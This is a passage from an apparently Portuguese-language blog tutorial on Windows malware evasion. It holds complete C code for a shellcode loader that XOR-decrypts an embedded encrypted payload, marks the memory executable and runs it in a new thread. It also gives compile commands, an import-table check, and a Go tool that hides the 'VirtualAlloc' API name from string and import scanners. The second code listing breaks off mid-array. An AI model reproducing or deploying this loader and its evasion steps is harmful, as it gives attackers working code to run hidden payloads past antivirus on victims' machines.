class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x7f</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x3a</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xb4</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">};</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

<span class="kt">char</span> <span class="n">xor_key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"7h3L0s7C4rc0s4"</span><span class="p">;</span>

<span class="n">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVA</span><span class="p">)(</span><span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">a</span><span class="p">];</span>
        <span class="n">a</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">BOOL</span> <span class="n">rx</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="kr">thread</span><span class="p">;</span>

    <span class="n">pVA</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">pVA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>

    <span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>

    <span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="n">rx</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">rx</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
            <span class="kr">thread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
            <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Podemos compilar:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>i686-w64-mingw32-gcc  shell.c <span class="nt">-o</span> test.exe <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="o">&gt;</span>/dev/null 2&gt;&amp;1
</pre></table></code></div></div><p>E checar a tabela de importação de endereços novamente:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>objdump <span class="nt">-x</span> <span class="nt">-D</span> test.exe | less
</pre></table></code></div></div><p>Desta vez, a função <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> não está mais presente na <em>import address table</em>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724144056.png" alt="" /></p><p>Porém, ainda existe um problema, quando tentamos extrair todas as <em>strings</em> do PE, ainda é possível identificar a <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724144729.png" alt="" /></p><p>Isso acontece, pois o nome da função está escrita em texto claro na função <code class="language-plaintext highlighter-rouge">GetProcAddress</code>. Para contornar esta situação, podemos reutilizar do <strong>XOR <em>encrypt</em></strong> que utilizamos no <em>shellcode</em>.</p><p>Portanto, criaremos duas variáveis:</p><ul><li><code class="language-plaintext highlighter-rouge">unsigned char cVA[] = {};</code> - que receberá um <em>array</em> de <em>bytes</em> representando a string “VirtualAlloc” depois do <strong>XOR <em>encrypt</em></strong>;<li><code class="language-plaintext highlighter-rouge">unsigned int cVALen = sizeof(cVA);</code> - que conterá o tamanho da <em>array</em>.</ul><p>Para aplicar o <strong>XOR <em>encrypt</em></strong> na <em>string</em>, faremos um novo programa em Go, que receberá a string com a chave e salvará o resultado em um arquivo.</p><div lang="go" class="language-go highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"fmt"</span>
        <span class="s">"os"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">xorEncryptDecrypt</span><span class="p">(</span><span class="n">data</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">,</span> <span class="n">key</span> <span class="kt">string</span><span class="p">)</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span>
        <span class="n">keyLen</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="n">keyBytes</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
                <span class="n">encrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">keyBytes</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">keyLen</span><span class="p">]</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="n">encrypted</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">processString</span><span class="p">(</span><span class="n">inputString</span><span class="p">,</span> <span class="n">outputFile</span><span class="p">,</span> <span class="n">key</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
        <span class="n">data</span> <span class="o">:=</span> <span class="nb">append</span><span class="p">([]</span><span class="kt">byte</span><span class="p">(</span><span class="n">inputString</span><span class="p">),</span> <span class="m">0</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">:=</span> <span class="n">xorEncryptDecrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>

        <span class="n">outFile</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Create</span><span class="p">(</span><span class="n">outputFile</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"failed to create output file: %w"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="k">defer</span> <span class="n">outFile</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>

        <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">outFile</span><span class="o">.</span><span class="n">Write</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"failed to write to output file: %w"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="no">nil</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">)</span> <span class="o">!=</span> <span class="m">4</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Usage: %s &lt;input string&gt; &lt;output file&gt; &lt;key&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>
                <span class="k">return</span>
        <span class="p">}</span>

        <span class="n">inputString</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
        <span class="n">outputFile</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">2</span><span class="p">]</span>
        <span class="n">key</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">3</span><span class="p">]</span>

        <span class="n">err</span> <span class="o">:=</span> <span class="n">processString</span><span class="p">(</span><span class="n">inputString</span><span class="p">,</span> <span class="n">outputFile</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Error: %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
        <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724145636.png" alt="" /></p><p>A declaração das variáveis fica da seguinte forma:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1">// XOR encrypted da VirtualAlloc</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">cVA</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cVALen</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cVA</span><span class="p">);</span>
</pre></table></code></div></div><p>Na função <code class="language-plaintext highlighter-rouge">main</code> chamamos a função <code class="language-plaintext highlighter-rouge">XOR</code> para aplicar o <strong>XOR <em>encryption</em></strong> em tempo de execução e a referenciamos na função <code class="language-plaintext highlighter-rouge">GetProcAddress</code> ao invés de chamar por uma <em>string</em>:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span 